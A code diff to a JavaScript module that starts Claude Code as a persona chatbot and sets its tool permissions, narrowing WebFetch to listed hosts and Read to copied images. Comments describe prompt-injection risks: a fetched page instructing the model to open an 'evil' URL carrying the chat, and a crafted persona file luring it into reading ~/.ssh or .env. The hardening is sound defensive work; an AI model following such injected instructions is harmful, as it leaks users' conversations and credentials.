@@ -92,14 +92,18 @@ function runProcess(args, { input = "", timeout = CC_TIMEOUT_MS, cwd = BRAIN_ROO
 /**
  * @param {string} systemFile
  * @param {number} imageCount pictures copied next to the prompt
- * @param {{ search?: boolean, fetch?: boolean }} [web] WebSearch for the morning look-up, WebFetch to open a link
+ * @param {{ search?: boolean, fetch?: boolean | string[] }} [web] WebSearch for the morning look-up, WebFetch to open a link.
+ *   fetch as a list of hosts: only those sites (a link you sent). A page she opens could otherwise
+ *   tell her to "open https://evil/?q=<your chat>" and leak what's in her prompt.
  */
 const replyArgs = (systemFile, imageCount, web = {}) => {
     // Read is allowed for the copied pictures only: a bare "Read" would let a crafted persona file
     // talk her into opening anything on this computer (~/.ssh, .env) and quoting it in chat
     const tools = [
         ...(imageCount ? [ [ "Read", "Read(./img-*)" ] ] : []),
-        ...(web.fetch ? [ [ "WebFetch", "WebFetch" ] ] : []),
+        ...(Array.isArray(web.fetch)
+            ? web.fetch.map((host) => [ "WebFetch", `WebFetch(domain:${host})` ])
+            : web.fetch ? [ [ "WebFetch", "WebFetch" ] ] : []),
         ...(web.search ? [ [ "WebSearch", "WebSearch" ] ] : []),
     ];
     const turns = 2 + imageCount + (web.fetch ? 4 : 0) + (web.search ? 10 : 0);
@@ -113,14 +117,13 @@ const replyArgs = (systemFile, imageCount, web = {}) => {
         "--strict-mcp-config",
         // Variadic flags go last; the prompt arrives on stdin, not as an argument
         ...(tools.length
-            ? [ "--tools", tools.map(([ t ]) => t).join(","), "--allowedTools", ...tools.map(([ , rule ]) => rule) ]
+            ? [ "--tools", [ ...new Set(tools.map(([ t ]) => t)) ].join(","), "--allowedTools", ...tools.map(([ , rule ]) => rule) ]
             : [ "--disallowedTools", "*" ]),
     ];
 };
 
 /* ------------------------------------ a claude started ahead of time */
 
-// CLAUDE_PREWARM=0 turns this off if your Claude Code version doesn't like waiting for its prompt
 // CLAUDE_PREWARM=0 turns this off if your Claude Code version doesn't like waiting for its prompt
 let prewarm = !/^(0|false|no)$/i.test(String(process.env.CLAUDE_PREWARM ?? ""));
 const SPARE_IDLE_MS = 15 * 60000;
